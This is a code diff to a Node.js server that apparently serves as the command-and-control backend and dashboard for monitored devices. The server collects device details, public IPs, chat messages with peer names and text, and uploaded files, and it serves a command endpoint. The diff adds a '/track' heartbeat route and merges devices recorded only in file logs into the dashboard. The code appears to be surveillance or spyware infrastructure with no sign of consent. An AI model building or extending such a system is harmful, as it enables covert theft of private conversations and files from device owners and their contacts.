@@ -162,7 +162,6 @@ function removeFileLogEntries(fileName) {
     } catch {}
 }
 
-// ✅ CORRECT ORDER: jsonResponse(res, payload, status)
 function jsonResponse(res, payload, status = 200) {
     const body = JSON.stringify(payload);
     res.writeHead(status, {
@@ -203,8 +202,11 @@ function notFound(res) {
     jsonResponse(res, { ok: false, error: "Not found" }, 404);
 }
 
+// heartbeat paths – also accept /track
 function isHeartbeatPath(pathname) {
-    return pathname === "/api/heartbeat" || pathname === "/api/v1/device/heartbeat";
+    return pathname === "/api/heartbeat" ||
+           pathname === "/api/v1/device/heartbeat" ||
+           pathname === "/track";
 }
 
 function isChatBatchPath(pathname) {
@@ -242,7 +244,7 @@ async function ensureDevice(deviceId, body, req) {
 }
 
 // ============================================
-// DATABASE HELPERS (for advanced dashboard)
+// DATABASE HELPERS
 // ============================================
 
 async function getDevices() {
@@ -269,26 +271,91 @@ function getFiles(deviceId = "") {
 }
 
 function isOnline(device) {
-    const t = Date.parse(device.server_last_seen || "");
+    const t = Date.parse(device.server_last_seen || device.lastSeen || "");
     return Number.isFinite(t) && Date.now() - t < 60000;
 }
 
+// Get distinct device IDs from file logs
+function getFileDeviceIds() {
+    const logs = readLogs();
+    const ids = new Set();
+    for (const entry of logs) {
+        if (entry.type === "file" && entry.device_id) {
+            ids.add(entry.device_id);
+        }
+    }
+    return ids;
+}
+
+// Enhanced devices with stats, merging Supabase + file-only devices
 async function devicesWithStats() {
-    const [devices, messages] = await Promise.all([getDevices(), getMessages()]);
+    const [supabaseDevices, messages] = await Promise.all([getDevices(), getMessages()]);
     const files = getFiles();
     const msgCounts = new Map();
     const fileCounts = new Map();
+    const deviceMap = new Map();
 
-    for (const msg of messages) msgCounts.set(msg.device_id, (msgCounts.get(msg.device_id) || 0) + 1);
-    for (const file of files) fileCounts.set(file.device_id, (fileCounts.get(file.device_id) || 0) + 1);
+    // Start with Supabase devices
+    for (const device of supabaseDevices) {
+        deviceMap.set(device.device_id, {
+            ...device,
+            online: isOnline(device),
+            display_name: device.public_id || device.my_name || device.device_id,
+            message_count: 0,
+            file_count: 0,
+            fromSupabase: true
+        });
+    }
 
-    return devices.map((device) => ({
-        ...device,
-        online: isOnline(device),
-        display_name: device.my_name || device.public_id || device.device_id,
-        message_count: msgCounts.get(device.device_id) || 0,
-        file_count: fileCounts.get(device.device_id) || 0
-    }));
+    // Add file-only devices (not in Supabase)
+    const fileDeviceIds = getFileDeviceIds();
+    for (const id of fileDeviceIds) {
+        if (!deviceMap.has(id)) {
+            // Create a minimal device entry from file logs
+            const fileEntries = files.filter(f => f.device_id === id);
+            const latestFile = fileEntries.sort((a, b) => new Date(b.time || 0) - new Date(a.time || 0))[0];
+            const device = {
+                device_id: id,
+                my_uid: "",
+                public_id: latestFile?.public_id || id,
+                my_name: "",
+                model: latestFile?.device_model || "",
+                brand: latestFile?.device_brand || "",
+                battery_percent: null,
+                network_type: "",
+                public_ip: latestFile?.ip || "",
+                server_last_seen: latestFile?.time || Date.now(),
+                created_at: latestFile?.time || Date.now(),
+                online: false,
+                display_name: latestFile?.public_id || id,
+                message_count: 0,
+                file_count: 0,
+                fromSupabase: false
+            };
+            deviceMap.set(id, device);
+        }
+    }
+
+    // Compute counts
+    for (const msg of messages) {
+        const d = deviceMap.get(msg.device_id);
+        if (d) d.message_count = (d.message_count || 0) + 1;
+    }
+    for (const file of files) {
+        const d = deviceMap.get(file.device_id);
+        if (d) d.file_count = (d.file_count || 0) + 1;
+    }
+
+    // Update online status for all (based on last seen time)
+    for (const [id, dev] of deviceMap) {
+        dev.online = isOnline(dev);
+        if (!dev.fromSupabase) {
+            dev.display_name = dev.public_id || dev.model || dev.device_id;
+        }
+    }
+
+    return Array.from(deviceMap.values())
+        .sort((a, b) => (b.online ? 1 : 0) - (a.online ? 1 : 0) || b.file_count - a.file_count);
 }
 
 // ============================================
@@ -471,7 +538,7 @@ function renderDevices() {
 function renderMain(device) {
   if (!device) { renderEmpty(); return; }
   document.getElementById('deviceTitle').textContent = device.display_name || device.device_id;
-  document.getElementById('deviceSub').textContent = (device.online?'🟢 Online':'⚪ Offline') + ' • Last seen '+fmtDate(device.server_last_seen);
+  document.getElementById('deviceSub').textContent = (device.online?'🟢 Online':'⚪ Offline') + ' • Last seen '+fmtDate(device.server_last_seen || device.lastSeen);
   document.getElementById('deviceStatus').textContent = '';
   switchTab(state.tab);
   if (state.tab === 'info') renderInfo(device);
@@ -488,7 +555,7 @@ function renderEmpty() {
 function renderInfo(device) {
   document.getElementById('tabInfo').innerHTML = \`
     <div class="info-grid">
-      \${['device_id','my_uid','public_id','my_name','brand','model','battery_percent','network_type','public_ip','server_last_seen','created_at'].map(k => \`
+      \${['device_id','public_id','my_uid','my_name','brand','model','battery_percent','network_type','public_ip','server_last_seen','created_at'].map(k => \`
         <div><div class="label">\${esc(k)}</div><div class="value">\${esc(device[k]??'-')}</div></div>
       \`).join('')}
     </div>
@@ -500,7 +567,7 @@ function renderChats() {
     <div class="chat-list">
       \${state.messages.map(m => \`
         <div class="chat-item">
-          <div><span class="peer">\${esc(m.peer_name||'Unknown')}</span> <span class="direction \${m.direction==='out'?'out':'in'}">\${esc(m.direction||'')}</span></div>
+          <div><span class="peer">\${esc(m.peer_name||m.peer_uid||'Unknown')}</span> <span class="direction \${m.direction==='out'?'out':'in'}">\${esc(m.direction||'')}</span></div>
           <div class="text">\${esc(m.text||'')}</div>
           <div class="time">\${fmtDate(m.message_time||m.received_at)}</div>
         </div>
@@ -609,7 +676,7 @@ const server = http.createServer(async (req, res) => {
         }
 
         // ============================================
-        // COMMAND (unchanged)
+        // COMMAND
         // ============================================
         if (req.method === "GET" && url.pathname === "/api/data") {
             return jsonResponse(res, command);
@@ -638,7 +705,7 @@ const server = http.createServer(async (req, res) => {
         }
 
         // ============================================
-        // DEVICE HEARTBEAT
+        // DEVICE HEARTBEAT (also /track)
         // ============================================
         if (req.method === "POST" && isHeartbeatPath(url.pathname)) {
             const body = await readBody(req);
@@ -815,7 +882,7 @@ const server = http.createServer(async (req, res) => {
         }
 
         // ============================================
-        // API: Get files for a device (legacy)
+        // LEGACY: Get files for a device
         // ============================================
         if (req.method === "GET" && url.pathname === "/api/files") {
             const deviceId = url.searchParams.get("deviceId");
@@ -830,7 +897,7 @@ const server = http.createServer(async (req, res) => {
         }
 
         // ============================================
-        // API: All files
+        // LEGACY: All files
         // ============================================
         if (req.method === "GET" && url.pathname === "/api/all-files") {
             const logs = readLogs();
@@ -983,6 +1050,8 @@ server.listen(PORT, () => {
 ║                                                              ║
 ║   📋 FEATURES:                                              ║
 ║      ✅ Interactive Device Dashboard                        ║
+║      ✅ Public ID shown (instead of internal UID)          ║
+║      ✅ Devices from both Supabase and file logs            ║
 ║      ✅ Device Info, Chats, Files (per device)              ║
 ║      ✅ File Preview & Delete                               ║
 ║      ✅ All existing endpoints unchanged                    ║
